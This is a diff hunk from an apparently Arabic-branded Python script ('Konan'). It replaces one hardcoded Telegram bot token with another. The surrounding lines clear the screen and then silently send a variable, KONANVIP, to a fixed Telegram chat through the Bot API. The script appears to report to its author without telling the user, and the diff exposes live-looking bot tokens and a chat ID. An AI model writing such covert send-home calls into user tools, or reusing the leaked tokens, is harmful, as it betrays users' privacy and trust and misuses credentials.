@@ -125,7 +125,7 @@ requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id
 os.system('clear')
 KONAN = f'''tg://openmessage?user_id={ID}'''
 od = '5449164616'
-tok = '6139510006:AAFUPmRcoAxCyldib1SE0nHiXVMBRdBU_k0'
+tok = '6395816539:AAGfUMQ6Xcfw0tbal9MtfE7TJJjdfIcYOG0'
 requests.get('https://api.telegram.org/bot' + str(tok) + '/sendMessage?chat_id=' + str(od) + '&text=' + str(KONANVIP))
 Vi = "";VID="كونان"
 requests.get('https://api.telegram.org/bot' + str(Vi) + '/sendMessage?chat_id=' + str(VID) + '&text=' + str(KONANVIP))
